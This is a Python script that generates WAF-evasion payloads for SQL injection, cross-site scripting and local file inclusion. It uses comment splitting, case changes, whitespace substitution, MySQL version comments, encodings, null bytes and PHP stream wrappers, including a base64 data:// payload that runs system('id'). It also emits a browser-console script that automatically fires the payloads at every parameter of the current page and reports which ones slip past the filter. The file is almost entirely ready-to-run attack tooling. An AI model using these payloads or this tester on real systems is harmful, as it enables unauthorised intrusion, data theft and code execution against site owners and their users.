#!/usr/bin/env python3
"""
WAF Bypass Payload Generator
Generates obfuscated and encoded payloads for WAF bypass
"""

import sys
import json
import base64
import urllib.parse

def url_encode(payload, double=False):
    """URL encode payload"""
    encoded = urllib.parse.quote(payload, safe='')
    if double:
        encoded = urllib.parse.quote(encoded, safe='')
    return encoded

def html_encode(payload):
    """HTML entity encode payload"""
    return ''.join(f'&#{ord(c)};' for c in payload)

def hex_encode(payload):
    """Hex encode payload"""
    return payload.encode().hex()

def unicode_encode(payload):
    """Unicode escape encode payload"""
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def base64_encode(payload):
    """Base64 encode payload"""
    return base64.b64encode(payload.encode()).decode()

def comment_insertion(payload, keyword):
    """Insert comments into SQL keywords"""
    replacements = {
        'SELECT': 'SEL/**/ECT',
        'UNION': 'UNI/**/ON',
        'FROM': 'FR/**/OM',
        'WHERE': 'WH/**/ERE',
        'AND': 'A/**/ND',
        'OR': 'O/**/R',
        'INSERT': 'IN/**/SERT',
        'UPDATE': 'UP/**/DATE',
        'DELETE': 'DEL/**/ETE',
        'DROP': 'DR/**/OP',
        'EXEC': 'EX/**/EC',
    }
    
    result = payload.upper()
    for key, value in replacements.items():
        result = result.replace(key, value)
    
    return result

def case_variation(payload):
    """Random case variation"""
    result = ''
    for i, c in enumerate(payload):
        if i % 2 == 0:
            result += c.upper()
        else:
            result += c.lower()
    return result

def whitespace_bypass(payload, ws_type='tab'):
    """Replace spaces with alternative whitespace"""
    whitespace = {
        'tab': '%09',
        'newline': '%0a',
        'cr': '%0d',
        'vtab': '%0b',
        'formfeed': '%0c',
        'nbsp': '%a0',
        'comment': '/**/',
    }
    
    ws = whitespace.get(ws_type, '%09')
    return payload.replace(' ', ws)

def mysql_comment(payload):
    """MySQL version comment bypass"""
    keywords = {
        'UNION': '/*!50000UNION*/',
        'SELECT': '/*!50000SELECT*/',
        'FROM': '/*!50000FROM*/',
        'WHERE': '/*!50000WHERE*/',
        'AND': '/*!50000AND*/',
        'OR': '/*!50000OR*/',
    }
    
    result = payload.upper()
    for key, value in keywords.items():
        result = result.replace(key, value)
    
    return result

def get_sqli_bypass_payloads():
    """Generate SQLi WAF bypass payloads"""
    base_payloads = [
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "admin'--",
        "' OR '1'='1",
    ]
    
    bypasses = []
    
    for payload in base_payloads:
        # Original
        bypasses.append({'technique': 'original', 'payload': payload})
        
        # Comment insertion
        bypasses.append({'technique': 'comment', 'payload': comment_insertion(payload, 'SQL')})
        
        # Case variation
        bypasses.append({'technique': 'case', 'payload': case_variation(payload)})
        
        # Whitespace alternatives
        for ws in ['tab', 'newline', 'cr', 'comment']:
            bypasses.append({'technique': f'whitespace_{ws}', 'payload': whitespace_bypass(payload, ws)})
        
        # URL encoding
        bypasses.append({'technique': 'url_encode', 'payload': url_encode(payload)})
        
        # Double URL encoding
        bypasses.append({'technique': 'double_url_encode', 'payload': url_encode(payload, double=True)})
        
        # Hex encoding
        bypasses.append({'technique': 'hex', 'payload': hex_encode(payload)})
        
        # MySQL comment
        bypasses.append({'technique': 'mysql_comment', 'payload': mysql_comment(payload)})
        
        # Combined: case + comment + whitespace
        combined = case_variation(comment_insertion(payload, 'SQL'))
        combined = combined.replace(' ', '/**/')
        bypasses.append({'technique': 'combined', 'payload': combined})
    
    return bypasses

def get_xss_bypass_payloads():
    """Generate XSS WAF bypass payloads"""
    base_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ]
    
    bypasses = []
    
    for payload in base_payloads:
        # Original
        bypasses.append({'technique': 'original', 'payload': payload})
        
        # Case variation
        bypasses.append({'technique': 'case', 'payload': case_variation(payload)})
        
        # Null byte
        bypasses.append({'technique': 'null_byte', 'payload': payload.replace('script', 'scr\x00ipt')})
        
        # Unicode
        bypasses.append({'technique': 'unicode', 'payload': unicode_encode(payload)})
        
        # HTML entities
        bypasses.append({'technique': 'html_entity', 'payload': html_encode(payload)})
        
        # URL encoding
        bypasses.append({'technique': 'url_encode', 'payload': url_encode(payload)})
        
        # Double URL encoding
        bypasses.append({'technique': 'double_url_encode', 'payload': url_encode(payload, double=True)})
        
        # Base64
        bypasses.append({'technique': 'base64', 'payload': base64_encode(payload)})
    
    # Additional bypass variants
    additional = [
        {'technique': 'no_parens', 'payload': '<svg onload=alert`1`>'},
        {'technique': 'template', 'payload': '{{constructor.constructor("alert(1)")()}}'},
        {'technique': 'event_handler', 'payload': '<details open ontoggle=alert(1)>'},
        {'technique': 'data_uri', 'payload': '<a href=data:text/html,<script>alert(1)</script>>click</a>'},
    ]
    
    bypasses.extend(additional)
    
    return bypasses

def get_lfi_bypass_payloads():
    """Generate LFI WAF bypass payloads"""
    base_payloads = [
        "/etc/passwd",
        "../../../etc/passwd",
    ]
    
    bypasses = []
    
    for payload in base_payloads:
        # Original
        bypasses.append({'technique': 'original', 'payload': payload})
        
        # URL encoding
        bypasses.append({'technique': 'url_encode', 'payload': url_encode(payload)})
        
        # Double URL encoding
        bypasses.append({'technique': 'double_url_encode', 'payload': url_encode(payload, double=True)})
        
        # Unicode
        bypasses.append({'technique': 'unicode', 'payload': payload.replace('/', '\\u2f')})
        
        # Null byte
        bypasses.append({'technique': 'null_byte', 'payload': payload + '%00'})
        
        # Path traversal variants
        bypasses.append({'technique': 'double_dot', 'payload': '....//....//....//etc/passwd'})
        bypasses.append({'technique': 'utf8', 'payload': '..%c0%af..%c0%af..%c0%afetc/passwd'})
        
        # PHP wrappers
        bypasses.append({'technique': 'php_filter', 'payload': 'php://filter/convert.base64-encode/resource=/etc/passwd'})
        bypasses.append({'technique': 'data', 'payload': 'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='})
    
    return bypasses

def generate_browser_script(payload_type, max_payloads=20):
    """Generate browser console script with WAF bypass payloads"""
    if payload_type == 'sqli':
        payloads = get_sqli_bypass_payloads()
    elif payload_type == 'xss':
        payloads = get_xss_bypass_payloads()
    elif payload_type == 'lfi':
        payloads = get_lfi_bypass_payloads()
    else:
        return f"Unknown type: {payload_type}"
    
    # Limit payloads
    payloads = payloads[:max_payloads]
    
    # Generate JavaScript array
    js_payloads = []
    for p in payloads:
        escaped = p['payload'].replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
        js_payloads.append(f'    {{technique: "{p["technique"]}", payload: "{escaped}"}}')
    
    js_array = ',\n'.join(js_payloads)
    
    return f"""
// WAF Bypass Tester - {payload_type.upper()}
(async () => {{
    const bypasses = [
{js_array}
    ];
    
    console.log('=== WAF Bypass Testing ({payload_type.upper()}) ===');
    console.log('Testing', bypasses.length, 'bypass techniques');
    
    const url = new URL(window.location.href);
    const params = url.searchParams;
    
    for (const [key, value] of params.entries()) {{
        console.log(`\\nParameter: ${{key}}=${{value}}`);
        
        for (const bypass of bypasses) {{
            const testUrl = new URL(url);
            testUrl.searchParams.set(key, bypass.payload);
            
            try {{
                const r = await fetch(testUrl.href, {{redirect: 'manual'}});
                const body = await r.text();
                
                const isBlocked = r.status === 403 || 
                                 r.status === 406 || 
                                 r.status === 429 ||
                                 body.includes('blocked') ||
                                 body.includes('forbidden') ||
                                 body.includes('access denied') ||
                                 body.includes('not acceptable');
                
                if (!isBlocked) {{
                    console.log(`  BYPASS: ${{bypass.technique}}`);
                    console.log(`    Payload: ${{bypass.payload}}`);
                    console.log(`    Status: ${{r.status}}`);
                }}
            }} catch(e) {{}}
        }}
    }}
}})();
"""

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 waf_bypass.py <command> [options]")
        print("\nCommands:")
        print("  sqli [max]      - Generate SQLi bypass payloads")
        print("  xss [max]       - Generate XSS bypass payloads")
        print("  lfi [max]       - Generate LFI bypass payloads")
        print("  script <type>   - Generate browser bypass script")
        print("  encode <text>   - Show all encodings of text")
        return
    
    command = sys.argv[1]
    
    if command == "sqli":
        max_payloads = int(sys.argv[2]) if len(sys.argv) > 2 else 20
        payloads = get_sqli_bypass_payloads()[:max_payloads]
        print(json.dumps(payloads, indent=2))
    
    elif command == "xss":
        max_payloads = int(sys.argv[2]) if len(sys.argv) > 2 else 20
        payloads = get_xss_bypass_payloads()[:max_payloads]
        print(json.dumps(payloads, indent=2))
    
    elif command == "lfi":
        max_payloads = int(sys.argv[2]) if len(sys.argv) > 2 else 20
        payloads = get_lfi_bypass_payloads()[:max_payloads]
        print(json.dumps(payloads, indent=2))
    
    elif command == "script":
        if len(sys.argv) < 3:
            print("Usage: python3 waf_bypass.py script <sqli|xss|lfi>")
            return
        payload_type = sys.argv[2]
        script = generate_browser_script(payload_type)
        print(script)
    
    elif command == "encode":
        if len(sys.argv) < 3:
            print("Usage: python3 waf_bypass.py encode <text>")
            return
        text = ' '.join(sys.argv[2:])
        print(f"Original: {text}")
        print(f"URL Encoded: {url_encode(text)}")
        print(f"Double URL Encoded: {url_encode(text, double=True)}")
        print(f"HTML Encoded: {html_encode(text)}")
        print(f"Hex Encoded: {hex_encode(text)}")
        print(f"Unicode Encoded: {unicode_encode(text)}")
        print(f"Base64 Encoded: {base64_encode(text)}")
    
    else:
        print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()
